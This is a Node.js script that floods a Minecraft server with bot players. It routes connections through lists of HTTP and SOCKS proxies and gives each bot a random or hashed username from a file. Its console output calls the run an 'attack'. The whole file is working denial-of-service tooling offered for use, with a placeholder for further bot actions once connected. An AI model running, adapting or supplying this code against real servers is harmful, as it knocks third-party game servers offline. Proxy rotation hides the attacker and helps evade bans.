//node index.js --host <ip> --port <port> --username true --version 1.8.8 --speed 120

const mc = require('minecraft-protocol')
const Http = require('http')
const socks = require('socks')
const readline = require('readline')
const crypto = require('crypto')
const fs = require('fs')
var async = require('async')
var argv = require('minimist')(process.argv.slice(2));

var proxy_array = []
var usernames = []

const host = getCommandArgument("host", "127.0.0.1")
const port = getCommandArgument("port", "25565")
const username = getCommandArgument("username", "true")
const version_server = getCommandArgument("version", "1.8.8")
const speedt = getCommandArgument("speed", "120")

/**
Identifiy proxies
**/
var proxy_type = {
  //HTTP port
  "80": "HTTP",
  "81": "HTTP",
  "8080": "HTTP",
  "3128": "HTTP",
  "8118": "HTTP",
  "808": "HTTP",
  "443": "HTTP",
  "8888": "HTTP",
  "57396": "HTTP",
  "37807": "HTTP",
  "56939": "HTTP",
  "999": "HTTP",

  //SOCKS port
  "1080": "SOCKS",
  "1081": "SOCKS",
  "8081": "SOCKS",
  "6667": "SOCKS",
  "7302": "SOCKS",
  "9999": "SOCKS",
  "25307": "SOCKS"
}

/**
Ignore error
*/
var error = false;
var error_socks = false;
process.on('uncaughtException', function (err) {
    error = true;
});

/**
Load username
*/
readline.createInterface({
    input: fs.createReadStream('usernames.txt'),
    console: false
}).on('line', function(line) {
    usernames.push(line);
});

/**
Load proxies
*/
const readInterface = readline.createInterface({
    input: fs.createReadStream('proxy.txt'),
    console: false
});

readInterface.on('line', function(line) {
    proxy_array.push(line);
});

readInterface.on('close', function(line) {

    if(proxy_array.length == 0){
        console.log("Please load proxies!")
        return
    }

		console.log()
		console.log("----------------------------")
		console.log("Launching attack to "+host+":"+port +' in '+version_server)
		console.log("Loaded proxies: "+proxy_array.length)
		console.log("Use username: "+username)
		console.log("Speed: "+speedt)
		console.log("----------------------------")
		console.log()

		async.eachSeries(proxy_array, function (element, next) {
  			setTimeout(function() {
    					error = false
              error_socks = false

    					var splitted = element.split(':')
    					var proxyHost = splitted[0]
    					var proxyPort = splitted[1]

    					connectToServer(proxyHost, proxyPort, host, port, genUsername(Math.floor((Math.random() * 12) + 4)))

    					next()
  			}, speedt)
		}, function () {
  			console.log()
  			console.log("----------------------------")
  			console.log('Attack finish!')
  			console.log("----------------------------")
  			console.log()
        process.exit(0)
		});
});

function connectToServer(proxyHost, proxyPort, host, port, name_player) {

    var proxyType = proxy_type[port]

    if(typeof proxyType === 'undefined' || proxyType === "HTTP"){

        //Prepare client with http proxy
        var client = mc.createClient({
            connect: (client) => {

                //Make the http connection
                var req = Http.request({
                    host: proxyHost,
                    port: proxyPort,
                    method: 'CONNECT',
                    path: host + ':' + parseInt(port),
                    timeout: 1200
                })

                //Return on any error
                client.on('error', function (err) {
                    return;
                })

                req.end()

                if(!error){
                    req.on('connect', function (res, stream) {
                        client.setSocket(stream)
                        client.emit('connect')
                    })
                }

            },
            username: name_player,
            version: version_server
        })
    }else if(proxyType === "SOCKS"){

        //Prepare client with socks proxy
        const client = mc.createClient({
            connect: client => {
                socks.createConnection({
                    proxy: {
                        ipaddress: proxyHost,
                        port: proxyPort,
                        type: 4
                    },
                    target: {
                        host: host,
                        port: parseInt(port)
                    },
                    timeout: 1200
                }, function (err, socket) {

                    if (err) {
                        error_socks = true
                        return
                    }

                    if(!error_socks){
                        client.setSocket(socket)
                        client.emit('connect')
                    }

                })
            },
            username: name_player,
            version: version_server
        })

    }
    if(error_socks)return
    if(!client)return

  	client.on('kick_disconnect', function (packet) {
  	     console.info('['+client.username+'] kicked for ' + getFormatedText(packet.reason))
  	})

  	client.on('disconnect', function (packet) {
  	     console.info('['+client.username+'] disconnect [' + getFormatedText(packet.reason)+']')
  	})

  	client.on('state', function (newState) {
        var state = ""+newState;

        if(state === "play"){

            console.log("["+client.username+"] "+" Connected !");
			
			//Do what you want

        }
  	})

  	client.on('end', function () {
        console.log('['+client.username+'] Connection lost')
  	})
}

function genUsername(length) {

    let random = usernames[Math.floor(Math.random()*usernames.length)]

    if(username === "true"){
        return random
    }

    return crypto.createHash('md5').update(random).digest("hex").substring(1, 15)

}

function getFormatedText(texts){

    var titi = JSON.stringify(JSON.parse(texts).extra);

    titi = titi.substr(1);
    titi = titi.substring(0, titi.length - 1)

    var final_text = "";

    titi.split(',').forEach(function(element) {
        if(element.includes("text")){
            final_text+=element.replace('"text":"', '').replace('"}', '');
        }
    });

    return final_text;
}

function getCommandArgument(argument, default_arg){
    if (argument){
        let argss = argv[argument];
        if (!argv[argument]){
            return default_arg
        }
        return argv[argument]
    }else{
        return default_arg
    }
}
